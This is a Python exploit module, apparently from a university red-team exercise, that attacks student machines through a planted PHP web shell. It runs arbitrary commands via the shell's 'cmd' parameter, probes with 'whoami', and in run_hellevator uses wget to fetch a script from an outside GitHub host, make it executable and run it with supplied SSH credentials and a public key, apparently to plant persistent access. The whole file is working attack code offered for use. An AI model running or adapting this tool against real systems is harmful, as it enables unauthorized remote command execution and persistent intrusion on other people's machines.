import urllib
import requests
from Exploit import Exploit, PatchedException
import BetterLogger
from BetterLogger import logger


class BackdoorTwoShellPHP(Exploit):
    """
    WARNING: PHP is dumb and won't let you run a process in the background like you expect, so you need to pipe the output to a file https://stackoverflow.com/questions/14555971/php-exec-background-process-issues
    WARNING: It's a bit tricky to tell if our commands were successful because `shell.php` does not return error codes or stderr, make sure to add 'echo $?' or something similar to the end of the command.
    """

    def __init__(self, ip_address, parsed_config) -> None:
        super().__init__(ip_address=ip_address, parsed_config=parsed_config)

    def run_command(self, command):
        # logger.debug(f"{self.ip_address} - Running command `{command}`...")
        http_encoded_command_to_run = urllib.parse.quote(command.encode("utf8"))
        server_response = requests.get(
            f"http://{self.ip_address}/arbitrary_file_upload/images/shell.php?cmd={http_encoded_command_to_run}",
            timeout=3,
        )
        server_status_code = server_response.status_code
        if server_status_code == 404:
            raise PatchedException(f"{self.ip_address} - Server responded with status code `{server_status_code}` which means the user patched this by removing `shell.php`")
        server_response_text = server_response.text
        command_output = server_response_text.split(f"{command}\n")[1].split("</body>")[0].rstrip()
        # logger.debug(f"{self.ip_address} - Command returned `{command_output}`.")
        return command_output

    def run_hellevator(self):
        try:
            logger.info(f"{self.ip_address} - Running Hellevator via BackdoorTwoShellPHP...")

            username = self.parsed_config["ssh_username"]
            password = self.parsed_config["ssh_password"]
            ssh_key = self.parsed_config["ssh_public_key"]

            download_hellevator_command = f"wget -O hellevator.sh https://raw.githubusercontent.com/joshmcorreia/SDSU_Cyber_Security_Red_Team/main/hellevator.sh && chmod +x hellevator.sh && ./hellevator.sh -u '{username}' -p '{password}' -s '{ssh_key}'"
            server_response_text = self.run_command(command=download_hellevator_command)
            if ssh_key in server_response_text:
                logger.info(f"{BetterLogger.COLOR_BLUE}{self.ip_address} - Successfully executed Hellevator via BackdoorTwoShellPHP!{BetterLogger.COLOR_END}")
                return True
            logger.info(f"{BetterLogger.COLOR_RED}{self.ip_address} - Something went wrong while executing Hellevator via BackdoorTwoShellPHP!{BetterLogger.COLOR_END}")
            return False
        except requests.ConnectionError:
            logger.info(f"{BetterLogger.COLOR_PINK}{self.ip_address} - Unable to test BackdoorTwoShellPHP because the student disabled the apache2 service!{BetterLogger.COLOR_END}")
            return None
        except PatchedException:
            logger.info(f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - The target is not vulnerable to BackdoorTwoShellPHP.{BetterLogger.COLOR_END}")
            return False
        except Exception as err:
            logger.info(f"{BetterLogger.COLOR_RED}{self.ip_address} - Something went wrong while executing Hellevator via BackdoorTwoShellPHP.{BetterLogger.COLOR_END}")
            logger.exception(err)
            return False

    def test_if_vulnerable(self):
        """
        Returns True if vulnerable and False if not
        """
        try:
            logger.info(f"{self.ip_address} - Testing if the target is vulnerable to BackdoorTwoShellPHP...")
            command = "whoami"
            server_output = self.run_command(command=command)
            if "www-data" in server_output:
                logger.info(f"{BetterLogger.COLOR_GREEN}{self.ip_address} - The target is vulnerable to BackdoorTwoShellPHP!{BetterLogger.COLOR_END}")
                return True
            raise PatchedException()
        except requests.ConnectionError:
            logger.info(f"{BetterLogger.COLOR_PINK}{self.ip_address} - Unable to test BackdoorTwoShellPHP because the student disabled the apache2 service!{BetterLogger.COLOR_END}")
            return None
        except PatchedException:
            logger.info(f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - The target is not vulnerable to BackdoorTwoShellPHP.{BetterLogger.COLOR_END}")
            return False
        except Exception as err:
            logger.info(f"{BetterLogger.COLOR_RED}{self.ip_address} - Something went wrong while checking if BackdoorTwoShellPHP is vulnerable.{BetterLogger.COLOR_END}")
            logger.exception(err)
            return False
